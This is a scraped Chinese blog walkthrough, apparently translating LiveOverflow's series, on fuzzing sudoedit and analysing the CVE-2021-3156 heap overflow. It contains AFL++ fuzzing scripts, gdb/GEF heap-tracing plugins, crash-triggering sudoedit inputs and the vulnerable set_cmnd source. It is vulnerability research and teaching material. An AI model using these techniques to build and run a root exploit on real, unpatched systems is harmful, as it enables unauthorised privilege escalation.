/usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]&#x27;&#x27;&#x27;import structmemmap = []for mem in vmmap.splitlines(): if &#x27;r-x&#x27; in mem: start, end, size, perm, f = mem.split(&#x27; &#x27;) start = int(start, 16) end = int(end, 16) memmap.append((start, end))with open(&#x27;/pwd/heap&#x27;,&#x27;rb&#x27;) as f: heap = f.read()n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 得到结果 能堆溢出的堆在最下面，不能覆写任何函数指针，艹 重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本 12345678910111213n = 0x41for i in range(0, len(heap), 8): heap_addr = i+0x005555555f9000 b = heap[i:i+8] q = struct.unpack(&#x27;Q&#x27;, b)[0] for mem in memmap: if q&gt;=mem[0] and q&lt;=mem[1]: # print(f&quot;0x&#123;heap_addr:016x&#125;: &#123;q:016x&#125; &#123;b&#125;&quot;) print(f&quot;set *0x&#123;heap_addr:016x&#125; = 0x&quot;+(hex(n)[2:]*5)) n += 1 if 0x000055555561b4d0 == heap_addr: print(f&quot;0x&#123;heap_addr:016x&#125;: our [buffer]&quot;) 生成不会造成crash的文件 1echo -en &quot;0edit\\x00-s\\x000000000&quot; &gt; /tmp/normal 在gdb中设置这些值 12345678910111213set *0x00005555556149a8 = 0x4141414141set *0x00005555556149b0 = 0x4242424242set *0x0000555555615260 = 0x4343434343set *0x0000555555615268 = 0x4444444444set *0x0000555555617e00 = 0x4545454545set *0x0000555555617eb0 = 0x4646464646set *0x0000555555618378 = 0x4747474747set *0x0000555555618398 = 0x4848484848set *0x00005555556183b8 = 0x4949494949set *0x00005555556183d8 = 0x4a4a4a4a4aset *0x00005555556184d8 = 0x4b4b4b4b4bset *0x0000555555619b40 = 0x4c4c4c4c4cset *0x000055555561a0b0 = 0x4d4d4d4d4d 取消断点继续，应该就会出现一些报错了 &gt;&gt;问题 没有出现报错，并且直接执行了 脚本的相关的地址写错了 发现一个红黑树! 结果看到compar变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖compar地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，set *0x000055555561a0b0 = 0x4d4d4d4d4d换掉，得到另一个crash 强制堆分配 在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。 核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk 改写sudo源码 真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo 添加打印参数Chunk地址 已上一节的红黑树为例，打印compar的值 忘写分号了 12./configure &amp;&amp; makeln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit 作者在这里踩了坑，我想复现下，不想看的可以略过 虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，但是这个库不含有printf即其他输出，自然也就没法打印字符串 &gt;&gt;问题 没有反应 找找是不是代码写的文件是其他文件的代码 所以使用make install安装方法就好了，只要之前make过一次之后就都可以了 堆溢出发生时，程序并不会立即crash，而是会进入到红黑树的部分，但是能溢出的user_args地址在rbtree1地址后面，所以依然无法利用 暴力测试脚本 尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的 输入来源 stdin 文件(files) 协议参数(arguments) 环境变量(env vars) 设置长度 123456# define some common size values usable for different inputs_SIZES = [i for i in range(0,0xff)]_SIZES += [2**i for i in range(0,15)]_SIZES += [(2**i)+1 for i in range(0,15)]_SIZES += [(2**i)-1 for i in range(0,15)]_SIZES += ([0]*50) sudo参数协议(sudo help) 1234567# define some flags from sudo -hARG1 = [&quot;-A&quot;,&quot;-B&quot;,&quot;-E&quot;,&quot;-e&quot;,&quot;-H&quot;,&quot;-K&quot;,&quot;-k&quot;,&quot;-l&quot;,&quot;-n&quot;,&quot;-P&quot;,&quot;-S&quot;,&quot;-s&quot;]ARG1 += [None, None, None, None, None, None, None]ARG2 = _SIZESARG3 = _SIZESHOSTNAME = _SIZESENV = _SIZES 设置测试集 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# dump a testcase into a logfiledef dump_file(fname, lines, ptrs, arg, env, key): # create the folders if they don&#x27;t exist directory = os.path.dirname(fname) if not os.path.exists(directory): os.makedirs(directory) # don&#x27;t write the dump file if it&#x27;s already too large if os.path.isfile(fname) and Path(fname).stat().st_size &gt; 200000: return # write to file with open(fname, &#x27;a+&#x27;) as f: f.write(&quot;----------------------------\\n&quot;) f.write(lines[1].decode(&#x27;ascii&#x27;)) if key: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] f.write(f&quot;user_args &lt; &#123;key.decode(&#x27;ascii&#x27;)&#125;\\n&quot;) f.write(f&quot;distance: 0x&#123;distance:x&#125;\\n&quot;) if key: f.write(f&quot;0x&#123;ptrs[b&#x27;user_args&#x27;]:016x&#125; &lt; 0x&#123;ptrs[key]:016x&#125;\\n&quot;) f.write(&quot;args: sudoedit &quot;) f.write(&quot; &quot;.join(arg)) f.write(&quot;\\n\\n&quot;) for k in env: f.write(f&quot;&#123;k&#125;=&#123;env[k]&#125;\\n&quot;) f.write(&quot;\\n&quot;) f.write(lines[0].decode(&#x27;ascii&#x27;)) f.write(&quot;\\n&quot;) test = &#123;&#125; test[&#x27;arg&#x27;] = arg test[&#x27;env&#x27;] = env f.write(json.dumps(test)) f.write(&quot;\\n\\n&quot;)# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return returnALPHABET = &#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27; fuzz主要功能 12345678910111213141516171819202122232425262728# fuzz loopwhile True: # select random size values arg1 = random.choice(ARG1) rand_arg2_size = random.choice(ARG2) rand_arg3_size = random.choice(ARG3) rand_hostname_size = random.choice(HOSTNAME) rand_env_size = random.choice(ENV) arg = [] env = &#123;&#125; # arguments # ... -s AAAAAAA\\ ... if arg1: arg.append(arg1) arg.append(&quot;-s&quot;) arg.append(random.choice(ALPHABET)*rand_arg2_size + &quot;\\\\&quot;) if rand_arg3_size: arg.append(random.choice(ALPHABET)*rand_arg3_size) # environment variables if rand_hostname_size: env[&quot;HOSTNAME&quot;] = random.choice(ALPHABET)*rand_hostname_size if rand_env_size: env[random.choice(ALPHABET)*3] = random.choice(ALPHABET)*rand_env_size # run sudoedit run_sudoedit(arg, env) 开始fuzz 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# this will run sudoedit with a set of arguments and environment variablesdef run_sudoedit(arg, env): print(&quot;-------------&quot;) # disable stdout buffering with stdbuf wrapping around sudoedit # and add the commandline arguments _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg # execute it p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) try: # send some newlines and check if we get any output lines = p.communicate(b&quot;x\\nx\\nx\\nx\\n&quot;, timeout=0.1) except subprocess.TimeoutExpired: # terminate on timeout p.terminate() lines = p.communicate() if p.returncode == -11: print(f&quot;SEGFAULT&quot;) # read the list of function pointers ptrs = &#123;&#125; skipping = True for line in lines[0].splitlines(): key,val = line.split(b&#x27;=&#x27;) if key == b&#x27;user_args&#x27;: skipping = False if not skipping: ptrs[key] = int(val,16) # go through all function pointers if ptrs and b&#x27;user_args&#x27; in ptrs: for key in ptrs: if key != b&#x27;user_args&#x27;: # is our overflow buffer before a function pointer? if ptrs[b&#x27;user_args&#x27;] &lt; ptrs[key]: distance = ptrs[key] - ptrs[b&#x27;user_args&#x27;] if distance&lt;14000: fname = f&#x27;&#123;FOLDER&#125;/&#123;distance&#125;&#x27; dump_file(fname, lines, ptrs, arg, env, key) # did we get a segfault? if p.returncode == -11: fname = f&quot;&#123;FOLDER&#125;/crashes/segfault_&#123;distance&#125;&quot; dump_file(fname, lines, ptrs, arg, env, None) return return 最后发现chunk位置相差太远不同 ，根本无法利用 GDB工具编写 阶段 1 要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次malloc下断点查看size参数。 更为便捷的技巧是查看free时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里 123456789set breakpoint pending onbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 运行 1gdb -x ./gdb.init /usr/local/bin/sudoedit &gt; free_trace 发现有环境变量，再次尝试设置环境变量 发现根本没变，要是我们尝试更多的环境变量呢？ 阶段 2 直接在加载环境变量（getenv(3p)）的时候下断点，看看用了那些 12345678910set breakpoint pending onbreak getenvcommands silent printf &quot;getenv(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 发现可以设置的环境变量值 再次改写脚本 12345678910111213141516171819202122232425262728set breakpoint pending onset environment LOCPATH = HEAP0set environment LC_ALL = HEAP1set environment LC_IDENTIFICATION = HEAP2set environment LANG = HEAP3set environment LC_MEASUREMENT = HEAP4set environment LC_TELEPHONE = HEAP5set environment LC_ADDRESS = HEAP6set environment LC_NAME = HEAP7set environment LC_PAPER = HEAP8set environment LC_MESSAGES = HEAP9set environment LC_MONETARY = HEAPAset environment LC_COLLATE = HEAPBset environment LC_TIME = HEAPCset environment LC_NUMERIC = HEAPDset environment LC_CTYPE = HEAPEset environment GCONV_PATH = HEAPFset environment TZ = HEAPGset environment SHELL = HEAPIbreak freecommands silent printf &quot;free(): %s\\n&quot;,$rdi continueendrun -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\\&#x27; 所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点 或许利用点在于覆写环境变量？ 阶段 3 这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请 作者直接写了一个gef的拓展工具 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit__AUTHOR__ = &quot;liveoverflow&quot;__VERSION__ = 0.1import collectionsimport gdbimport json# persist &quot;database&quot; to the filedef dump(j): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;w&#x27;) as f: f.write(json.dumps(j))# load &quot;database&quot; from the filedef load(): with open(&#x27;/tmp/malloc.json&#x27;, &#x27;r&#x27;) as f: j = json.loads(f.read()) return j# handler for malloc() breakpointsclass MallocBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.addr = None return # malloc() breakpoint triggered def stop(self): log = &#123;&#125; # extract information about this malloc() log[&quot;size&quot;] = get_register(&quot;$rdi&quot;) log[&quot;rip&quot;] = get_register(&quot;$rip&quot;) log[&quot;backtrace&quot;] = gdb.execute(&#x27;bt&#x27;, to_string=True) log[&#x27;name&#x27;] = gdb.newest_frame().older().name() # set a breakpoint at the malloc() return if log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in log[&#x27;name&#x27;]: self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older()) return False self.retbp = MallocReturnBreakpoint(log=log) return False# breakpoint for the return of a malloc()class MallocReturnBreakpoint(gdb.FinishBreakpoint): def __init__(self, log, overwrite=False, *args, **kwargs): if not overwrite: overwrite = gdb.newest_frame() super(MallocReturnBreakpoint, self).__init__(overwrite, internal=False) self.silent = False self.log = log def stop(self): # extract some information self.log[&#x27;addr&#x27;] = get_register(&quot;$rax&quot;) self.log[&#x27;name&#x27;] = gdb.newest_frame().name() # load the mallocs() we logged before MALLOCS = load() # add this malloc to the known allocations MALLOCS[str(self.log[&#x27;addr&#x27;])] = self.log dump(MALLOCS) # this is the location of our overflowing buffer # now we can dump the heap analysis if self.log[&#x27;name&#x27;] and &#x27;set_cmnd&#x27; in self.log[&#x27;name&#x27;]: print(&quot;YYYYYYYYYYY WE ARE IN!!!&quot;) addr = get_register(&quot;$rax&quot;) mallocs = [int(a) for a in MALLOCS] mallocs.sort() SHOW = 5 out = &#x27;&#x27; for mall in mallocs: if mall &gt; addr and SHOW&gt;0: h = MALLOCS[str(mall)] for line in h[&#x27;backtrace&#x27;].split(&#x27;\\n&#x27;)[1:]: if line: l = line.split() print(l) if l[3] != &#x27;??&#x27;: out += (l[3]) + &quot; &quot; out += &quot;\\n&quot; SHOW -= 1 out += &quot;\\n&quot; print(out) with open(&#x27;/tmp/heap&#x27; ,&#x27;w&#x27;) as f: f.write(out) return True return False# set a breakpoint on free()class FreeBreakpoint(gdb.Breakpoint): def __init__(self, location, *args, **kwargs): super(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=False) self.silent = True self.size = None self.malloc = [] self.addr = None return def stop(self): log = &#123;&#125; log[&quot;addr&quot;] = get_register(&quot;$rdi&quot;) # check if the memory freed was allocated before MALLOCS = load() if str(log[&quot;addr&quot;]) in MALLOCS: # remove this object from the list of allocated objects del MALLOCS[str(log[&quot;addr&quot;])] dump(MALLOCS) return False# the gdb command that starts the heap traceclass SudoeditCommand(GenericCommand): &quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot; _cmdline_ = &quot;sudoedit&quot; _syntax_ = f&quot;&#123;_cmdline_&#125;&quot; def do_invoke(self, args): dump(&#123;&#125;) self.bkps = [] # set the breakpoints self.bkps.append(MallocBreakpoint(location=&quot;__libc_malloc&quot;)) self.bkps.append(FreeBreakpoint(location=&quot;__libc_free&quot;)) #self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;)) #self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;)) #self.bkps.append(FreeBreakpoint(location=&quot;free&quot;)) gdb.events.exited.connect(self.cleanup) return def cleanup(self, events): print(&quot;CLEANUP!!!&quot;) for bp in self.bkps: bp.delete() gdb.events.exited.disconnect(self.cleanup) returnif __name__ == &quot;__main__&quot;: register_external_command(SudoeditCommand()) 设置插件 1gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit 使用 1gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log 主要就是跟踪malloc和free在堆溢出之后的行为 只有将这个改写到暴力脚本里面，找到符合条件的Chunk","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [2]","slug":"sudo-fuzz2exp-2","date":"2022-04-13T03:12:03.000Z","updated":"2023-06-01T14:24:02.402Z","comments":true,"path":"2022/04/13/sudo-fuzz2exp-2/","link":"","permalink":"https://joe1sn.eu.org/2022/04/13/sudo-fuzz2exp-2/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Troubleshooting AFL Fuzzing Problems | Ep. 03 Finding Buffer Overflow with Fuzzing | Ep. 04 Found a Crash Through Fuzzing? Minimize AFL Testcases! | Ep. 05 Root Cause Analysis With AddressSanitizer (ASan) | Ep. 06 Understanding C Pointer Magic Arithmetic | Ep. 07 C Code Review - Reaching Vulnerable Code in sudo | Ep. 08 解决AFL的小麻烦 因为时间原因，我并不能一直开着电脑跑，不过我翻译一下作者遇到的问题 No more free CPU cores 作者在遇到fuzz很慢的时候，尝试关闭一个fuzz，然后重启 然后使用ps aux产看全部运行过程，发现afl在尝试fuzz这些奇怪的东西（因为sudo中可能会有exec之类的）。然后pkill vi关闭所有vi的进程就短暂的解决了这个问题。 **解决：**彻底解决的话要关闭所有在sudo中的exec相关函数，然后重新编译 And of Disk Space 作者查看空间使用情况过后发现磁盘空间充足，但是任然不能创建文件 但是使用df -i查看inode节点，发现被占满了 **inode (index node)**是指在许多“类Unix文件系统”中的一种数据结构，用于描述文件系统对象（包括文件、目录、设备文件、socket、管道等）。每个inode保存了文件系统对象数据的属性和磁盘块位置[1]。文件系统对象属性包含了各种元数据（如：最后修改时间） ，也包含用户组（owner ）和权限数据 说明有过多的细小文件使用光了inode节点号，最后在/var/tmp找到了这些文件，原因是fuzz的时候产生了例如../../的路径穿越。 **解决：**手动在sudo要创建文件的时候添加上一个crash，这里用空指针引用 12printf(&quot;mk tmp file(%s)\\n&quot;,stuff);*(int *)0=0; 之后开始fuzz 然后分析crash 但是又引入了新的问题： root和普通用户相同吗？ 这里就要说到sudo的原理，sudo是通过在root条件下使用setuid的方式来让普通用户指令得到root执行。 比如我们在user下fuzz，但是真实情况会将它变为root下运行 如果要在fuzz时实现真实情况的效果，那么就要将当前用户uid设置为普通用户的 sudo-1.8.31p2/src/sudo.c get_user_info 1234ud-&gt;uid = 1000//getuid();ud-&gt;euid = geteuid();ud-&gt;gid = 1000//getgid();ud-&gt;egid = getegid(); 忘写分号了 找到缓冲区溢出 作者用上一节的fuzz得到了一些ctash样本，本章内容讲的基本上是分析这些样本 gdb调试 和我预料的一样，这样做会产生大量的非sudo从而crash的样本，可以用以下命令查看 12grep -R sudoedit file_floder/grep -R sudo file_floder/ 为了方便分析，可以安装一些gdb的插件，如pwndbg，也在CVE分析的文章里讲过了该插件的安装(不要放在共享文件夹/pwd下安装) 有的crash是由于fuzzer的错误引起的，作者使用了这段代码判断 1234567#include &quot;argv-fuzz-inl.h&quot;int main(int argc, char *argv[], char *envp[])&#123; AFL_INIT_ARGV(); // argv is now the fake argv execve(&quot;/usr/local/bin/sudo&quot;, argv, envp);&#125; 作者遇到的第一个问题是argv-fuzz-inl中的ret数组造成的栈溢出，覆写了其他的函数指针造成crash 解决 如果rc比最大参数数量大时退出循环 更换fuzzer 使用更好的fuzzer：AFL++ 项目地址：https://github.com/AFLplusplus/AFLplusplus AFL++支持对命令行的fuzz，所以之前的修改要去掉 要新建镜像的话，可以在Dockerfile中加上 1RUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make install 1234567891011FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -yq gcc make wget curl git vim gdb clang llvm lld llvm-dev bsdmainutils libstdc++-10-dev python3 python3-pip python3-dev automake flex bison build-essential libglib2.0-dev libpixman-1-dev python3-setuptools RUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus &amp;&amp; make source-only &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 重新编译 123whereis afl-clang-fastls -lah /usr/local/bin/afl-clang-fastCC=afl-cc ./configure --disable-shared &amp;&amp; make -j8 开始fuzz，指令-T参数可以指定argv[0] 1afl-fuzz -i /tmp/in/ -o /tmp/out/ -T sudoedit ./src/sudo 我这里故意放了能够引起crash的样本进去只为了加速过程 分析新的crash 判断是否为误报 我直接使用作者的crash文件，你可以在：https://github.com/LiveOverflow/pwnedit/tree/main/episode05 中找到 id_000000,sig_06,src_000083+000451,time_23448104,op_splice,rep_8 ​ 检验下在我的环境里面是否会有crash root user gdb调试 原视频里面用的是GEF，这里我用pwndbg，新人(没有CTFpwn经验)建议用GEF 程序自动运行后停止了 说明这个错误是被malloc给抛出的 **这会是一个新的0day吗？**在最新平台上测试后发现并不是 简化crash 其实我做到这一步想到的是用afl-tmin，后来发现作者尝试其他方案失败后，我就直接用afl-tmin了 在user下检验 创建软链接 12ln -s /usr/local/bin/sudo 0editls -lah 0edit 运行测试 有趣的发现 结尾是xedit这种形式就可以调用sudoedit 使用ASAN分析漏洞 asan一直是一个很操蛋的工具，经常报错，作者也在这里报错很多，我也是直接展示正常（正常报错）做法 1make clean &amp;&amp; ./configure CFLAGS=&quot;-fsanitize=address,undefined -g&quot; LDFLAGS=&quot;-fsanitize=address,undefined&quot; CC=clang --disable-shared &amp;&amp; make -j8 送入mini_crash样例检测 如果没有加上--disable-shared的话，就算有-g参数，也不会知道具体代码在哪里 现在我们知道漏洞的位置在/plugins/sudoers/./sudoers.c:868的set_cmnd函数内 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110static intset_cmnd(void)&#123; struct sudo_nss *nss; char *path = user_path; int ret = FOUND; debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN) /* Allocate user_stat for find_path() and match functions. */ user_stat = calloc(1, sizeof(struct stat)); if (user_stat == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(NOT_FOUND_ERROR); &#125; /* Default value for cmnd, overridden below. */ if (user_cmnd == NULL) user_cmnd = NewArgv[0]; if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123; if (def_secure_path &amp;&amp; !user_is_exempt()) path = def_secure_path; if (!set_perms(PERM_RUNAS)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); if (ret == NOT_FOUND) &#123; /* Failed as root, try as invoking user. */ if (!set_perms(PERM_USER)) debug_return_int(-1); ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path, def_ignore_dot, NULL); if (!restore_perms()) debug_return_int(-1); &#125; if (ret == NOT_FOUND_ERROR) &#123; if (errno == ENAMETOOLONG) audit_failure(NewArgc, NewArgv, N_(&quot;command too long&quot;)); log_warning(0, &quot;%s&quot;, NewArgv[0]); debug_return_int(ret); &#125; &#125; /* set user_args */ if (NewArgc &gt; 1) &#123; char *to, *from, **av; size_t size, n; /* Alloc and build up user_args. */ for (size = 0, av = NewArgv + 1; *av; av++) size += strlen(*av) + 1; if (size == 0 || (user_args = malloc(size)) == NULL) &#123; sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); debug_return_int(-1); &#125; if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; else &#123; for (to = user_args, av = NewArgv + 1; *av; av++) &#123; n = strlcpy(to, *av, size - (to - user_args)); if (n &gt;= size - (to - user_args)) &#123; sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__); debug_return_int(-1); &#125; to += n; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; &#125; &#125; if ((user_base = strrchr(user_cmnd, &#x27;/&#x27;)) != NULL) user_base++; else user_base = user_cmnd; /* Convert &quot;sudo sudoedit&quot; -&gt; &quot;sudoedit&quot; */ if (ISSET(sudo_mode, MODE_RUN) &amp;&amp; strcmp(user_base, &quot;sudoedit&quot;) == 0) &#123; CLR(sudo_mode, MODE_RUN); SET(sudo_mode, MODE_EDIT); sudo_warnx(U_(&quot;sudoedit doesn&#x27;t need to be run via sudo&quot;)); user_base = user_cmnd = &quot;sudoedit&quot;; &#125; TAILQ_FOREACH(nss, snl, entries) &#123; if (!update_defaults(nss-&gt;parse_tree, NULL, SETDEF_CMND, false)) &#123; log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR, N_(&quot;problem with defaults entries&quot;)); &#125; &#125; debug_return_int(ret);&#125; 漏洞造成的原因在CVE那篇文章分析过了 简化漏洞模型 这里的视角更像是给CTF出题，我也确实一句这个漏洞出过一道，不过在这里我们后面会完成exp的编写，所以只写c程序分析就行了 精简一下上面的源代码，问题出现在这里 1234567891011if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;;&#125; 如果最后一个参数是\\的话，from++， 然后*to++ = *from++，此时的from指针就超出了边界，造成堆溢出 